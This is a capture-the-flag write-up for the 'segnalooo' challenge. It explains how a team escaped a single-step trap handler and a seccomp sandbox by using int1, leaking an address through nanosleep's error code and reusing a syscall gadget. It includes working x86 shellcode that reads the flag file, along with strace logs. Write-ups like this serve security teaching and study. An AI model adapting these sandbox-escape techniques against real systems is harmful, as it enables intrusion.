# segnalooo (20 solves)
```none
x86 assembly is crazy. I hope this challenge will help you understand it a bit better.

segnalooo.challenges.ooo 4321

Files:
* stub 3580bf5cffb81b8de3cf352fe031486e6d73c12ff6a25761a656334b1fa7f65d
```

Solved by (alphabetical order): n00byedge,
[PewZ](https://twitter.com/0xbadcafe1),
[zanderdk](https://twitter.com/alexanderkrog), zopazz, zzz

## TL;DR
1. send `int1` to raise `SIGTRAP`, clear TF, but don't write `ud2`
   instruction
2. now we can execute arbitrary shellcode (limited to 56-1 bytes) because our
   shellcode borders on the stack region, which is `rw` (not executable).
3. disclose the signal handler address using `nanosleep` (it will return
   `-EFAULT` when the first argument is an invalid address)
4. use the `syscall; sub rsp, 8; ret` gadget to run arbitrary syscalls
5. `open("/flag") + sendfile(fd, 1, NULL, 0x100)`
6. flag!

## Overview
Following is an overview of what the provided binary does:
* reads shellcode as hex
* "relocates" a `SIGTRAP` handler to a randomized region
	* randomized from base address `0x100000000000`
* moves shellcode into a new region (also randomized)
	* randomized from base address `0x500000000000`
* both the handler and the shellcode gets its own stack located right after the
  code region
* some code is prepended to the shellcode
* set up a seccomp filter that has the following restrictions:
	* `munmap` and `nanosleep` syscalls are allowed
	* `execve` is denied
	* code running at an address lower than `0x80000000` can execute any
	  syscall
* the code looks like this:
	* unmap all memory mappings except sigtrap + signal stack and shellcode +
	  shellcode stack
    * call nanosleep
    * int3 instruction
	* nop sled
	* `push 0x100; popf`
	* then comes our shellcode
* the `push 0x100; popf` instructions enable the trap flag (TF), thus enabling
  single-step mode
	* when TF is enabled, every instruction we execute will raise `SIGTRAP`
* `int3` triggers the signal handler, which performs the following steps:
    * check how many times we've been triggered (max 4 times)
    * signal number has to be `SIGTRAP`
	* if the signal code (`si_code`) is `SI_KERNEL`, call a pointer on the
	  stack. This pointer points to the nop sled right before `popf` and our
	  shellcode
	* if `si_code` is `TRAP_TRACE`, print the current instruction length and
	  then write an `ud2` instruction into the offending address (from
	  `si_addr`)
	* `si_code` is `TRAP_TRACE` when we are in single-step mode
	* `si_code` is `SI_KERNEL` if we execute an `int3` instruction
	* `si_addr` points to the *next* instruction we are going to execute. i.e.
	  the instruction is executed *before* `SIGTRAP` is raised

If we try to execute any instruction, it will cause a `SIGTRAP` to be raised,
and we end up in the signal handler. Since `si_code` is `TRAP_TRACE`, it will
print the length of the instruction we executed and then write an `ud2`
instruction into the address of the *next* instruction in our shellcode. The
handler then returns back to this instruction, which causes `SIGILL` to be
raised and the program crashes.

We were stuck at this point for a really long time. First of all, we spent a
long time trying to understand the signal handler. The seccomp filter was also
really confusing since it checks if RIP is larger than `0x80000000`, which
isn't true for the signal handler region or the shellcode region. However, when
running the program with strace we can clearly see that the signal handler uses
`mprotect` to mark memory as rw to write the `ud2` instruction:

```console
$ strace ./stub
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=13, filter=0x602260}) = 0
munmap(0x5940862a2000, 42603824664576)  = 0
munmap(0x108822749000, 582)             = 0
munmap(NULL, 18176879595520)            = 0
nanosleep({tv_sec=0, tv_nsec=200000000}, NULL) = 0
--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
--- SIGTRAP {si_signo=SIGTRAP, si_code=TRAP_TRACE, si_pid=2250903497, si_uid=22848} ---
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "1", 11)                        = 1
write(1, "\n", 1
)                       = 1
mprotect(0x5940862a0000, 4096, PROT_READ|PROT_WRITE) = 0
mprotect(0x5940862a0000, 4096, PROT_READ|PROT_EXEC) = 0
--- SIGILL {si_signo=SIGILL, si_code=ILL_ILLOPN, si_addr=0x5940862a0fc9} ---
+++ killed by SIGILL +++
[2]    2664428 illegal hardware instruction  strace ./stub.bak
```

We tried to figure out why this happened, but couldn't figure out why this part
of the code was allowed to execute syscalls, but we assumed that for some
reason this handler can execute anything. We also found a `syscall ; sub rsp, 8
; ret` gadget in this region that we thought might be useful if we wanted to
run arbitrary syscalls later.

(after reading [another
writeup](https://blog.jsec.xyz/ctf-write-up/2021/05/03/DEFCON_CTF_2021_segnalooo_write-up.html)
we found out that only the lower 4 bytes of RIP are checked!)

For a while we were basically out of ideas, and started looking through [a list
of every x86 instruction](https://www.felixcloutier.com/x86/) and stumbled
across the [int1](https://www.felixcloutier.com/x86/intn:into:int3:int1)
instruction (opcode `0xf1`). This looked interesting, so we decided to send
that as our shellcode and observe the behavior:

```console
$ strace ./stub
--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
--- SIGTRAP {si_signo=SIGTRAP, si_code=TRAP_BRKPT, si_pid=3370233801, si_uid=22098} ---
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x5652c8e1b000} ---
```

Interesting... We are getting a `SIGTRAP`, but this time, `si_code` is
`TRAP_BRKPT` instead of the usual `TRAP_TRACE` we see for other instructions
like `nop` (opcode `0x90`):

```console
$ strace ./stub
--- SIGTRAP {si_signo=SIGTRAP, si_code=TRAP_TRACE, si_pid=2408755145, si_uid=21835} ---
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "1", 11)                        = 1
write(1, "\n", 1
)                       = 1
mprotect(0x554b8f92a000, 4096, PROT_READ|PROT_WRITE) = 0
mprotect(0x554b8f92a000, 4096, PROT_READ|PROT_EXEC) = 0
--- SIGILL {si_signo=SIGILL, si_code=ILL_ILLOPN, si_addr=0x554b8f92afc9} ---
+++ killed by SIGILL +++
```

Also note that when we used `int1`, the code didn't call `write()` or
`mprotect()`. Let's take a look at the signal handler in pseudo C and see
what's going on:

```c
int sigtrap_handler(int sig, siginfo_t *info, void *ucontext)
{
	int signo;
	size_t count;
	uintptr_t addr;
	uintptr_t shellcode_addr;
	int signal_code;

	signo = info->si_signo;
	signal_code = info->si_code;
	addr = info->_sifields._sigfault.si_addr;

	shellcode_addr = *(uintptr_t *)((rsp & 0xfffffffffffff000ULL) + 0xff8);
	count = *(size_t *)((rsp & 0xfffffffffffff000ULL) + 0xff0);
	*(size_t *)((rsp & 0xfffffffffffff000ULL) + 0xff0) = count + 1;

	if (count >= 4)
		__halt();
	if (signo != SIGTRAP)
		__halt();
	
	if (signal_code != SI_KERNEL) {
		if (signal_code == TRAP_TRACE) {
			print_instruction_length();
			mprotect((void *)shellcode_addr, 0x1000, PROT_READ | PROT_WRITE);
			/* ud2 opcode == 0x0f0b */
			*(addr + 0) = 0x0f;
			*(addr + 1) = 0x0b;
			mprotect((void *)shellcode_addr, 0x1000, PROT_READ | PROT_EXEC);
		}

		/* make sure we are executing code within the shellcode region */
		if (shellcode_addr >= addr)
			__halt();
		if ((shellcode_addr + 0x1000) <= addr)
			__halt();

		/* note: this is a jmp, not a call */
		((void (*))addr)();
	}

	/* jmp back to shellcode */
	((void (*))(shellcode_addr + 0x50))();
}
```

Let's try running a simple `nop` instruction again and see what happens:
```console
[1] --- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
[2] --- SIGTRAP {si_signo=SIGTRAP, si_code=TRAP_TRACE, si_pid=3828600777, si_uid=22167} ---
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "0", 10)                        = 1
write(1, "1", 11)                        = 1
write(1, "\n", 1
)                       = 1
mprotect(0x5697e433c000, 4096, PROT_READ|PROT_WRITE) = 0
mprotect(0x5697e433c000, 4096, PROT_READ|PROT_EXEC) = 0
[3] --- SIGILL {si_signo=SIGILL, si_code=ILL_ILLOPN, si_addr=0x5697e433cfc9} ---
+++ killed by SIGILL +++
```

The first `SIGTRAP` ([1]) is caused by the `int3` instruction. Then, our `nop`
causes the second `SIGTRAP` ([2]). The first two checks in the signal handler
will pass, since `count` is 1 at that point, and `signo` is `SIGTRAP`.
`signal_code` is not `SI_KERNEL`, so we enter the if block. Now, the
signal code is `TRAP_TRACE`, as we can see in the strace output.

The handler will proceed to print the length of the instruction and then write
the `ud2` instruction into the address of the next instruction we are going to
execute. When the handler finishes we land on the `ud2` and the program
crashes ([3]).

Now, what happens when we use `int1`?

```console
$ strace ./stub
--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
--- SIGTRAP {si_signo=SIGTRAP, si_code=TRAP_BRKPT, si_pid=3370233801, si_uid=22098} ---
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x5652c8e1b000} ---
```

Again, the first `SIGTRAP` is caused by the `int3` instruction. Then, our
`int1` instruction raises another `SIGTRAP`, but this time we don't go into the
if block that writes the `ud2` instruction. Instead, we simply return from the
handler and keep executing the shellcode. The cool thing, however, is that the
trap flag is now cleared, so subsequent instructions don't cause any further
`SIGTRAP`s! We can observe this by adding a `syscall` instruction after the
`int3`, and we should get a `SIGSYS` (since seccomp is blocking most syscalls),
which means that both instructions have executed.


At this point we can execute arbitrary shellcode. There are a couple of
constraints, however:
* we can only use `munmap` and `nanosleep`
* the max length of the shellcode is 56 bytes (including the `int1`)
	* this is because our shellcode is placed at the end of a page, located
	  right before the shellcode stack (which is mapped `rw`)

Since we found a `syscall ; sub rsp, 8 ; ret` gadget in the signal handler
code, we decided to try and disclose the address of this memory region and jump
there to execute arbitrary syscalls. Since `execve` is disabled we ended up
using `open` and `sendfile` to read the flag.

`munmap` seemed a bit useless, but after a quick look at the implementation of
`nanosleep` in the kernel, we saw that it would return `-EFAULT` if the first
pointer argument is invalid. We can use this property to bruteforce addresses
starting from the lowest possible signal handler address until `nanosleep` no
longer returns `-EFAULT`.

## Shellcode time!
```none
s:
    lea rsp, [rip + stash]
    pop rbp
    pop rdi
l:  add rdi, rbp
    push 35
    pop rax
    syscall
firstret:
    cmp al, -EFAULT
    je l

    pop rax
    lea rbx, [rdi + 0x192]

    lea rdi, [rip + s - 0xFC9 + 0x1000]
    pop rsi
    add rcx, rsi

    push rbp
    pop rsi
    pop rdx

    push rcx
    pop rcx
    jmp rbx

.zero 40
stash:
.8byte 0x1000
.8byte 1 << (11 * 4)
.8byte 10
.8byte cat_flag - firstret
.8byte 7
stash_end:
.zero 16

filename:
    .asciz "/flag"
cat_flag:
    // open
    lea rdi, [rip + filename]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    lea rbp, [rip + fin]
    push rbp
    pop rbp
    jmp rbx

fin:
    mov rdi, 1
    mov rsi, rax
    mov rax, 40
    xor rdx, rdx
    mov r10, 0x100
    push 0
    call rbx
```

The shellcode can take a long time to run, since the number of potential valid
addresses is huge, but after running several instances of the shellcode for a
while we finally got the flag (16 minutes before the competition ended):
`OOO{s3riously,wh4tISsigaltstack???}`

### Debugging
Since the bruteforcing step of the shellcode was slow, we wanted a way to debug
the binary so we could test our solution before waiting forever to see if it
crashed.

There were also some issues when debugging since the program handles `SIGTRAP`,
which is trapped by debuggers like gdb when we single-step through the code.
To make it easier to debug we created a patched version of the binary with the
following modifications:

* it no longer handles `SIGTRAP`, but `SIGILL` instead
* check for `SIGILL` in the handler
* replace the `int3` instruction before our shellcode with `ud2`

We then did something like this:
* break before running the shellcode
* step until we reach `ud2`
* when we step again we end up in the signal handler
* set `signal_code` to `SI_KERNEL`
* step out of the handler
* skip the nop slide
* we don't want to execute the `int3` instruction at the start of the shellcode
  so skip that (or use nop when testing)

At that point we could successfully step through the shellcode to discover any
problems. To speed it up we could manually set the first argument to
`nanosleep` to the correct address.
